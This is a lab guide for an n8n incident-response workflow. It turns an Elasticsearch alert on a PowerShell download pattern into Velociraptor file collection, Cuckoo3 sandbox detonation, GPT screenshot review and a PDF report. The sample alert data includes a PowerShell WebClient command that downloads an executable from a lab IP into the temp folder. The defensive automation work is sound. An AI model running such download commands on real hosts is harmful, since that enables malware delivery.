# (n8n) Suspicious PowerShell Download and Execute Pattern

As a base for this workflow, I will use an alert based on the ESQL query described in the [Suspicious PowerShell Download and Execute Pattern](/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/Suspicious-PowerShell-Download-and-Execute-Pattern.md) scenario. 

## Brief workflow overview

<div align="center">
    <img alt="Suspicious PowerShell Download and Execute Pattern workflow topology" src="/resources/n8n-workflows/Suspicious-PowerShell-Download-and-Execute-Pattern/images/topology.png" width="100%">
</div>

I will provide short information about what each node does, what input it requires, and what output it provides. IP addresses are provided based on the [main project topology](/resources/images/vagrant-lab-virtual-topology.svg) implementation.

### ES-GET-ALERTS

Node: `Elasticsearch`

Create new credentials with `elastic` username, password, and URL `https://172.16.10.5:9200`

Resource: `Document`

Operation: `Get Mane`

Index ID: `.alerts-security.alerts-default`

Return All: `enable`

Simplify: `enable`

Option: `Query`

```
{
  "query": {
    "bool": {
      "must": [
        { "term": { "kibana.alert.workflow_status": "open" } },
        { "term": { "kibana.alert.rule.name": "ESQL - Suspicious PowerShell Download and Execute Pattern" } },
        {
          "range": {
            "@timestamp": {
              "gte": "now-15m",
              "lte": "now"
            }
          }
        }
      ]
    }
  },
  "sort": [
    { "@timestamp": { "order": "desc" } }
  ]
}
```

You can change `kibana.alert.rule.name` to rule ID if you want to change the rule name.

This is the main Elasticsearch node that outputs all data per rule with a defined time frame.

### ES-EXTRACT-DATA

This node will format data from the Elasticsearch node, just to extract only what's useful for this workflow.

Node: `Set`

Mode: `Manual Mapping`

Fields to Set (name and value pair)

```
kibana.alert.original_time
{{ $json['out.timestamp'] }}
```

```
user.name
{{ $json['user.name'] }}
```

```
host.name
{{ $json['host.name'] }}
```

```
event.action
{{ $json['out.event.action'] }}
```

```
process.command_line
{{ $json['out.process.command.line'] }}
```

```
file.path
{{ $json['out.file.path'] }}
```

```
file.name
{{ $json['out.file.name'] }}
```

```
kibana.alert.uuid
{{ $json["kibana.alert.uuid"] }}
```

```
kibana.alert.rule.name
{{ $json['kibana.alert.rule.name'] }}
```

Output example:

```
[
  {
    "kibana": {
      "alert": {
        "original_time": "2025-10-17T16:16:34.709Z",
        "uuid": "e9541a2de77d94911abd6cf1150a3c1344aa1504",
        "rule": {
          "name": "ESQL - Suspicious PowerShell Download and Execute Pattern"
        }
      }
    },
    "user": {
      "name": "vagrant"
    },
    "host": {
      "name": "win-user-1"
    },
    "event": {
      "action": "creation"
    },
    "process": {
      "command_line": "powershell -NoProfile -command (New-Object System.Net.WebClient).DownloadFile('http://100.65.0.6/WinPingDemo.exe', \"$env:TEMP\\\\WinPingDemo.exe\")"
    },
    "file": {
      "path": "C:\\Users\\vagrant\\AppData\\Local\\Temp\\WinPingDemo.exe",
      "name": "WinPingDemo.exe"
    }
  }
]
```

### ssh-VELO-GET-CID

Node: `SSH Execute`

You need to add credentials for the Velociraptor node. Host is `172.16.10.8`, username - `vagrant` with the same default password.

Command:

```bash
sudo pyvelociraptor --config /opt/velociraptor/api.config.yaml \
  "SELECT client_id FROM clients() WHERE os_info.hostname = '{{$json.host.name}}'" \
  2>&1 | tail -n 1 \
  | python3 -c 'import sys,ast; print(ast.literal_eval(sys.stdin.read())[0]["client_id"])'
```

Output:

```
[
  {
    "code": 0,
    "signal": null,
    "stdout": "C.29eb084b9a7d388b",
    "stderr": ""
  }
]
```

This node returns the Client ID.

### FORMAT-FILE-PATH

Node: `Code`

JavaScript:

```javascript
const filePath = $("ES-EXTRACT-DATA").first().json.file.path;
const modifiedPath = filePath.replace(/\\/g, '//');
return {
  json: {
    file: {
      path: modifiedPath
    }
  }
};
```

Output:

```
[
  {
    "file": {
      "path": "C://Users//vagrant//AppData//Local//Temp//WinPingDemo.exe"
    }
  }
]
```

Before getting the Flow ID, we will format the file.path.

### ssh-VELO-GET-FID

Node: `SSH Execute`

Command:

```bash
sudo pyvelociraptor --config /opt/velociraptor/api.config.yaml \
"SELECT collect_client(
    client_id='{{ $('ssh-VELO-GET-CID').item.json.stdout }}',
    artifacts=['Windows.Search.FileFinder'],
    env=dict(
      SearchFilesGlobTable='Glob\n{{ $json.file.path }}',
      Accessor='auto',
      Upload_File='Y',
      Calculate_Hash='Y'
    )
  ).flow_id AS flow_id FROM scope()" \
2>&1 | tail -n 1 | python3 -c 'import sys,ast; print(ast.literal_eval(sys.stdin.read())[0]["flow_id"])'
```

Output:

```
[
{
"code": 0,
"signal": null,
"stdout": "F.D3PNM1G72TM3K",
"stderr": ""
}
]
```

### ssh-VELO-DOWNLOAD-FILE

Node: `SSH Execute`

Command:

```bash
sudo pyvelociraptor --config /opt/velociraptor/api.config.yaml \
"SELECT OSPath, Upload FROM flow_results(
    client_id='{{ $('ssh-VELO-GET-CID').item.json.stdout }}',
    flow_id='{{ $('ssh-VELO-GET-FID').item.json.stdout }}',
    artifact='Windows.Search.FileFinder'
)"
```

In the output, you will see the path to the executable.

```
[
{
"code": 0,
"signal": null,
"stdout": "Sat Oct 18 11:33:36 2025: Starting query execution.\n\nSat Oct 18 11:33:36 2025: Time 0: Test: Sending response part 0 475 B (1 rows).\n\n[{'OSPath': 'C:\\\\Users\\\\vagrant\\\\AppData\\\\Local\\\\Temp\\\\WinPingDemo.exe', 'Upload': {'Path': 'C:\\\\Users\\\\vagrant\\\\AppData\\\\Local\\\\Temp\\\\WinPingDemo.exe', 'Size': 3005440, 'StoredSize': 3005440, 'sha256': '45d887b19c9968f5ee3c1ef0db0ccf708bd799951918aa1d37fb0bf327fbddd2', 'md5': 'f6ac47c21a6b8487ad1c6ddad21164e8', 'StoredName': 'C:\\\\Users\\\\vagrant\\\\AppData\\\\Local\\\\Temp\\\\WinPingDemo.exe', 'Components': ['C:', 'Users', 'vagrant', 'AppData', 'Local', 'Temp', 'WinPingDemo.exe'], 'Accessor': 'auto'}}]",
"stderr": ""
}
]
```

### ssh-VELO-GET-FILE-PATH

The downloaded file is saved in the Velociraptor node within a specific Client ID collections directory for the Flow ID.

Node: `SSH Execute`

Command:

```bash
CID="{{ $('ssh-VELO-GET-CID').item.json.stdout }}"
FID="{{ $('ssh-VELO-GET-FID').item.json.stdout }}"
WPATH='{{ $('FORMAT-FILE-PATH').item.json.file.path }}'
BASE="/opt/velociraptor/clients/$CID/collections/$FID/uploads"

# Transform Windows path to Unix relative path
REL="$(printf "%s" "$WPATH" | sed -E 's|^[A-Za-z]:[\\/]+||' | tr '\\' '/')"
BASENAME="$(basename "$REL")"

# Case-insensitive path match (better for Windows paths)
SRC="$(sudo find "$BASE" -type f \( -ipath "*/$REL" -o -iname "$BASENAME" \) -print -quit 2>/dev/null)"

if [ -n "$SRC" ]; then
  echo "$SRC"
else
  echo "Not found: $WPATH" >&2
  exit 1
fi
```

Output:

```
[
  {
    "code": 0,
    "signal": null,
    "stdout": "/opt/velociraptor/clients/C.29eb084b9a7d388b/collections/F.D3PNM1G72TM3K/uploads/auto/C%3A/Users/vagrant/AppData/Local/Temp/WinPingDemo.exe",
    "stderr": ""
  }
]
```

### ssh-CUCKOO-GET-API-KEY

New SSH node for the Cuckoo3 node. First, add new credentials.

Node: `SSH Execute`

Command:

```
sudo -u cuckoo /home/cuckoo/cuckoo3/venv/bin/cuckoo --cwd /home/cuckoo/.cuckoocwd api token --list | awk -F'|' '/^\|.*[0-9].*\|/ {gsub(/[[:space:]]/, "", $6); print $6}'
```

It will return the API key that was configured during the [installation stage](/resources/docs/vm-setup/setup-cuckoo3.md).

### ssh-VELO-SUBMIT-FILE-TO-CUCKOO

From the same Velociraptor node, we will submit this file to the Cuckoo3 sandbox.

Node: `SSH Execute`

Command:

```bash
sudo curl -sS http://172.16.10.3:8090/submit/file \
  -H "Authorization: token {{ $json.stdout }}" \
  -F "file=@{{ $('ssh-VELO-GET-FILE-PATH').item.json.stdout }}" \
  -F 'settings={"platforms":[{"platform":"windows","os_version":"10"}],"timeout":120}' \
  | jq -r '.analysis_id'
```

In the output it will return analysis ID

```
[
  {
    "code": 0,
    "signal": null,
    "stdout": "20251018-V0K7DD",
    "stderr": ""
  }
]
```

### HTTP Request

This node will return the analysis status.

Node: `HTTP Request`

Method: `GET`

URL:

```
http://172.16.10.3:8090/analysis/{{ $json.stdout }}
```

Send Headers: `enable`

JSON

```
{
  "Authorization": "token {{ $('ssh-CUCKOO-GET-API-KEY').item.json.stdout }}"
}
```

Output:

```
[
  {
    "id": "20251018-V0K7DD",
    "kind": "standard",
    "state": "finished",
    "settings": {
      "timeout": 120,
      "priority": 1,
      "platforms": [
        {
          "platform": "windows",
          "os_version": "10",
          "tags": [],
          "settings": {
            "browser": "",
            "route": {},
            "command": []
          }
        }
      ],
      "manual": false,
      "dump_memory": false,
      "options": {},
      "enforce_timeout": true,
      "route": {},
      "command": [],
      "orig_filename": false,
      "password": "",
      "browser": "",
      "extrpath": []
    },
    "created_on": "2025-10-18T11:52:05.655985Z",
    "category": "file",
    "submitted": {
      "size": 3005440,
      "md5": "f6ac47c21a6b8487ad1c6ddad21164e8",
      "sha1": "edd32d26a404a5b8eb83d89427bb9ab85f502111",
      "sha256": "45d887b19c9968f5ee3c1ef0db0ccf708bd799951918aa1d37fb0bf327fbddd2",
      "sha512": "e14190c6f5565c3aa05c3f72b36be15ff201e9611a05250ef9fc1232889c8c82f2404d4c1dee2f423d96d0fceb4191283b43b450aec0bfa56646cb4e4ca621d5",
      "media_type": "application/x-dosexec",
      "type": "PE32+ executable (GUI) x86-64, for MS Windows",
      "filename": "WinPingDemo.exe",
      "category": "file"
    },
    "score": 7,
    "target": {
      "filename": "WinPingDemo.exe",
      "orig_filename": "WinPingDemo.exe",
      "platforms": [
        {
          "platform": "windows",
          "os_version": ""
        }
      ],
      "size": 3005440,
      "filetype": "PE32+ executable (GUI) x86-64, for MS Windows",
      "media_type": "application/x-dosexec",
      "extrpath": [],
      "password": "",
      "machine_tags": [],
      "container": false,
      "sha512": "e14190c6f5565c3aa05c3f72b36be15ff201e9611a05250ef9fc1232889c8c82f2404d4c1dee2f423d96d0fceb4191283b43b450aec0bfa56646cb4e4ca621d5",
      "sha256": "45d887b19c9968f5ee3c1ef0db0ccf708bd799951918aa1d37fb0bf327fbddd2",
      "sha1": "edd32d26a404a5b8eb83d89427bb9ab85f502111",
      "md5": "f6ac47c21a6b8487ad1c6ddad21164e8"
    },
    "errors": {},
    "tasks": [
      {
        "id": "20251018-V0K7DD_1",
        "platform": "windows",
        "os_version": "10",
        "state": "reported",
        "score": 7,
        "started_on": "2025-10-18T11:54:21.067639Z",
        "stopped_on": "2025-10-18T11:56:42.489564Z"
      }
    ],
    "families": [],
    "tags": [],
    "ttps": [
      {
        "id": "T1497.001",
        "name": "System Checks",
        "tactics": [
          "Defense Evasion",
          "Discovery"
        ],
        "reference": "https://attack.mitre.org/techniques/T1497/001",
        "subtechniques": []
      },
      {
        "id": "T1082",
        "name": "System Information Discovery",
        "tactics": [
          "Discovery"
        ],
        "reference": "https://attack.mitre.org/techniques/T1082",
        "subtechniques": []
      },
      {
        "id": "T1012",
        "name": "Query Registry",
        "tactics": [
          "Discovery"
        ],
        "reference": "https://attack.mitre.org/techniques/T1012",
        "subtechniques": []
      }
    ]
  }
]
```

### If

Node: `If`

Condition: `{{ $json.state }}` is equal to `finished`

### CUCKOO-GET-TASK-STATS

Extract only necessary information from the analysis.

Node: `Set`

Mode: `Manual Mapping`

Fields to Set:

```
submitted.md5
{{ $json.submitted.md5 }}
```

```
submitted.sha1
{{ $json.submitted.sha1 }}
```

```
submitted.sha256
{{ $json.submitted.sha256 }}
```

```
state
{{ $json.state }}
```

```
settings.platforms[0].os_version
{{ $json.settings.platforms[0].os_version }}
```

```
tasks[0].id
{{ $json.tasks[0].id }}
```

```
id
{{ $json.id }}
```

The main fields that we can use are hashes and task ID.

```
[
  {
    "submitted": {
      "md5": "f6ac47c21a6b8487ad1c6ddad21164e8",
      "sha1": "edd32d26a404a5b8eb83d89427bb9ab85f502111",
      "sha256": "45d887b19c9968f5ee3c1ef0db0ccf708bd799951918aa1d37fb0bf327fbddd2",
      "sha512": "e14190c6f5565c3aa05c3f72b36be15ff201e9611a05250ef9fc1232889c8c82f2404d4c1dee2f423d96d0fceb4191283b43b450aec0bfa56646cb4e4ca621d5"
    },
    "state": "finished",
    "settings": {
      "platforms": [
        {
          "platform": "windows",
          "os_version": "10"
        }
      ]
    },
    "tasks": [
      {
        "id": "20251018-V0K7DD_1"
      }
    ],
    "id": "20251018-V0K7DD"
  }
]
```

### VT-CHECK-HASH

Implementation is omitted, just a reserved node. If you want, you can analyze the hash. Add VirusTotal API key first.

Node: `VirusTotal`

Methond: `GET`

URL:

```
https://www.virustotal.com/api/v3/files/{{ $json.submitted.md5 }}
```

### CUCKOO-GET-TASK-ANALYSIS

Node: `HTTP Request`

Method: `GET`

URL:

```
http://172.16.10.3:8090/analysis/{{ $json.id }}/task/{{ $json.tasks.last().id }}/post
```

Send Headers: `enable`

JSON:

```
{
  "Authorization": "token {{ $('ssh-CUCKOO-GET-API-KEY').item.json.stdout }}"
}
```

This node returns all information about the task, and the output is omitted because it's too long. In the further workflow, we will only extract the command lines of processes.

### CUCKOO-ANALYSIS-GET-PROCESSES

Node: `Split`

This node will turn the list of command lines of processes from the task output into separate items.

Fields to split Out: `processes.process_list`

Include: `No Other Fields`

Output:

```
[
  {
    "pid": 4644,
    "ppid": 3140,
    "procid": 80,
    "parent_procid": 57,
    "image": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\WinPingDemo.exe",
    "name": "WinPingDemo.exe",
    "commandline": "\"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\WinPingDemo.exe\"",
    "tracked": true,
    "injected": false,
    "state": "running",
    "start_ts": 641,
    "end_ts": null
  },
  {
    "pid": 4680,
    "ppid": 4644,
    "procid": 81,
    "parent_procid": 80,
    "image": "C:\\Windows\\system32\\ping.exe",
    "name": "ping.exe",
    "commandline": "ping -n 1000 1.1.1.1",
    "tracked": true,
    "injected": false,
    "state": "terminated",
    "start_ts": 1000,
    "end_ts": 15985
  },
  {
    "pid": 4900,
    "ppid": 580,
    "procid": 84,
    "parent_procid": 6,
    "image": "\\??\\c:\\windows\\system32\\svchost.exe",
    "name": "svchost.exe",
    "commandline": "c:\\windows\\system32\\svchost.exe -k netsvcs",
    "tracked": true,
    "injected": false,
    "state": "terminated",
    "start_ts": 10266,
    "end_ts": 101266
  },
  {
    "pid": 4488,
    "ppid": 580,
    "procid": 90,
    "parent_procid": 6,
    "image": "\\??\\c:\\windows\\system32\\svchost.exe",
    "name": "svchost.exe",
    "commandline": "c:\\windows\\system32\\svchost.exe -k netsvcs -s BITS",
    "tracked": true,
    "injected": false,
    "state": "running",
    "start_ts": 80391,
    "end_ts": null
  },
  {
    "pid": 4524,
    "ppid": 580,
    "procid": 92,
    "parent_procid": 6,
    "image": "\\??\\c:\\windows\\system32\\svchost.exe",
    "name": "svchost.exe",
    "commandline": "c:\\windows\\system32\\svchost.exe -k localserviceandnoimpersonation -s SSDPSRV",
    "tracked": true,
    "injected": false,
    "state": "running",
    "start_ts": 80719,
    "end_ts": null
  },
  {
    "pid": 1948,
    "ppid": 580,
    "procid": 93,
    "parent_procid": 6,
    "image": "\\??\\c:\\windows\\system32\\svchost.exe",
    "name": "svchost.exe",
    "commandline": "c:\\windows\\system32\\svchost.exe -k netsvcs -s wlidsvc",
    "tracked": true,
    "injected": false,
    "state": "running",
    "start_ts": 81000,
    "end_ts": null
  },
  {
    "pid": 3120,
    "ppid": 580,
    "procid": 94,
    "parent_procid": 6,
    "image": "C:\\Windows\\System32\\svchost.exe",
    "name": "svchost.exe",
    "commandline": "C:\\Windows\\System32\\svchost.exe -k wsappx -s ClipSVC",
    "tracked": true,
    "injected": false,
    "state": "running",
    "start_ts": 81375,
    "end_ts": null
  }
]
```

### EXTRACT-COMMAND_LINES

Node: `Aggregate`

Aggregate: `All Item Data (Into a Single List)`

Put Output in Field: `process`

Include: `Specified Fields`

Fields To Include: `commandline`

Output:

```
[
  {
    "process": [
      {
        "commandline": "\"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\WinPingDemo.exe\""
      },
      {
        "commandline": "ping -n 1000 1.1.1.1"
      },
      {
        "commandline": "c:\\windows\\system32\\svchost.exe -k netsvcs"
      },
      {
        "commandline": "c:\\windows\\system32\\svchost.exe -k netsvcs -s BITS"
      },
      {
        "commandline": "c:\\windows\\system32\\svchost.exe -k localserviceandnoimpersonation -s SSDPSRV"
      },
      {
        "commandline": "c:\\windows\\system32\\svchost.exe -k netsvcs -s wlidsvc"
      },
      {
        "commandline": "C:\\Windows\\System32\\svchost.exe -k wsappx -s ClipSVC"
      }
    ]
  }
]
```

### Split Out

This node will extract the list of task screenshots.

Node: `Split`

Fields To Split Out: `scrennshot`

Include: `No Other Fields`

Output:

```
[
  {
    "name": "16863.jpg",
    "percentage": 15.478333333333333
  },
  {
    "name": "18574.jpg",
    "percentage": 1.7175
  },
  {
    "name": "20635.jpg",
    "percentage": 1.3733333333333333
  },
  {
    "name": "22283.jpg",
    "percentage": 1.0941666666666667
  },
  {
    "name": "23596.jpg",
    "percentage": 1.1366666666666667
  },
  {
    "name": "24960.jpg",
    "percentage": 0.9125
  },
  {
    "name": "26055.jpg",
    "percentage": 0.9133333333333333
  },
  {
    "name": "27151.jpg",
    "percentage": 3.5208333333333335
  },
  {
    "name": "31376.jpg",
    "percentage": 9.8
  },
  {
    "name": "43136.jpg",
    "percentage": 64.05333333333333
  }
]
```

### CUCKOO-GET-IMAGES

This node will get images from the Cuckoo node via API.

Node: `HTTP Request`

Method: `GET`

URL:

```
http://172.16.10.3:8090/analysis/{{ $('CUCKOO-GET-TASK-STATS').item.json.id }}/task/{{ $('CUCKOO-GET-TASK-STATS').item.json.tasks.last().id }}/screenshot/{{$json.name}}
```

Send Headers: `enable`

Specify Headers: `Using JSON`

JSON:

```
{
  "Authorization": "token {{ $('ssh-CUCKOO-GET-API-KEY').item.json.stdout }}"
}
```

Option: `Response`

Response Format: `File`

Put Output in Field: `data`

After execution, you will see screenshots in binary format.

### Analyze image

I want to show an example of how easily AI can be integrated, and here I decided to implement GPT image analysis.

Add credentials first.

Text Input (you can experiment with the prompt):

```
Analyze this screenshot to detect application windows with READABLE TEXT CONTENT.

STRICT DETECTION RULES:
1. Window must be open AND fully loaded
2. Text must be visible INSIDE the window's content area (NOT just the title bar)
3. IGNORE: Window title bars, taskbar text, desktop icons
4. IGNORE: Empty windows, blank windows, black screens, white screens, loading windows
5. Only detect windows where the MAIN CONTENT AREA contains readable text, dialog messages, documents, or UI elements with text

IMAGE FILENAME: {{ $json.name }}

CRITICAL OUTPUT RULES:
- Return ONLY raw JSON on a single line
- DO NOT wrap in markdown code fences (no ```)
- DO NOT add any explanations or extra text
- DO NOT use backticks

CORRECT FORMAT:
{"filename":"{{ $json.name }}"}
or
{}

WRONG FORMAT (DO NOT USE):
{"filename":"example.jpg"}

Your response must be raw JSON only:

## Alternative - Ultra Simple:

Does this screenshot show a window with visible text in the content area (ignore title bars)?

Image: {{ $json.name }}

Rules:
- Empty/loading windows = NO
- Only title bar visible = NO
- Text in window body = YES

Return ONLY this (no markdown, no code fences, no backticks):
{"filename":"{{ $json.name }}"} if YES
{} if NO
```

Input Type: `Binary Files`

Input Data Field Name: `data`

It will return only images based on the prompt.

### GET-AI-IMAGES

This node will format the output to take only the list of images.

Node: `Code`

JavaScript:

```javascript
// Parse all content and extract filenames
const filenames = [];

for (const item of $input.all()) {
  const content = JSON.parse(item.json.content);
  
  if (content.filename) {
    filenames.push(content.filename);
  }
}

// Return as single item with array
return [
  {
    json: {
      filenames: filenames
    }
  }
];
```

Output example:

```
[
  {
    "filenames": [
      "27151.jpg",
      "31376.jpg",
      "43136.jpg"
    ]
  }
]
```

### Merge

This node will merge all data before generating the report.

Node: `Merge`

Mode: `SQL Query`

Number of Inputs: `3`

Query:

```sql
SELECT * FROM input1 
LEFT JOIN input2 ON input1.name = input2.id
LEFT JOIN input3 ON 1=1
```

Output example:

```
[
  {
    "kibana": {
      "alert": {
        "original_time": "2025-10-17T16:16:34.709Z",
        "uuid": "e9541a2de77d94911abd6cf1150a3c1344aa1504",
        "rule": {
          "name": "ESQL - Suspicious PowerShell Download and Execute Pattern"
        }
      }
    },
    "user": {
      "name": "vagrant"
    },
    "host": {
      "name": "win-user-1"
    },
    "event": {
      "action": "creation"
    },
    "process": [
      {
        "commandline": "\"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\WinPingDemo.exe\""
      },
      {
        "commandline": "ping -n 1000 1.1.1.1"
      },
      {
        "commandline": "c:\\windows\\system32\\svchost.exe -k netsvcs"
      },
      {
        "commandline": "c:\\windows\\system32\\svchost.exe -k netsvcs -s BITS"
      },
      {
        "commandline": "c:\\windows\\system32\\svchost.exe -k localserviceandnoimpersonation -s SSDPSRV"
      },
      {
        "commandline": "c:\\windows\\system32\\svchost.exe -k netsvcs -s wlidsvc"
      },
      {
        "commandline": "C:\\Windows\\System32\\svchost.exe -k wsappx -s ClipSVC"
      }
    ],
    "file": {
      "path": "C:\\Users\\vagrant\\AppData\\Local\\Temp\\WinPingDemo.exe",
      "name": "WinPingDemo.exe"
    },
    "filenames": [
      "27151.jpg",
      "31376.jpg",
      "43136.jpg"
    ]
  }
]
```

### GENERATE-HTML

This node will generate the [HTML template](/resources/n8n-workflows/Suspicious-PowerShell-Download-and-Execute-Pattern/reports/template.js)

Node: `Code`

Output is ommited.

### BUILD-HTML

This node will create an HTML file.

Node: `Code`

JavaScript:

```
return items.map(it => {
  const html = it.json.html || '<!doctype html><html><body>No HTML</body></html>';

  return {
    json: {
      ...it.json,
    },
    binary: {
      report_html: {
        data: Buffer.from(html).toString('base64'),
        mimeType: 'text/html',
        fileExtension: 'html',
        fileName: 'index.html',
      }
    }
  };
});
```

### GENERATE-PDF

Node: `HTTP Request`

Method: `POST`

URL: `http://172.16.10.7:3000/forms/chromium/convert/html`

Send Bode: `enable`

Bode Content Type: `Form-Data`

Parameter Type: `n8n Binary File`

Name: `files`

Input Data Field Name: `report_html`

Options: `Response`

Response Format: `File`

Put Output in Field: `pdf`

This will return [report in PDF format](/resources/n8n-workflows/Suspicious-PowerShell-Download-and-Execute-Pattern/reports/report.pdf)
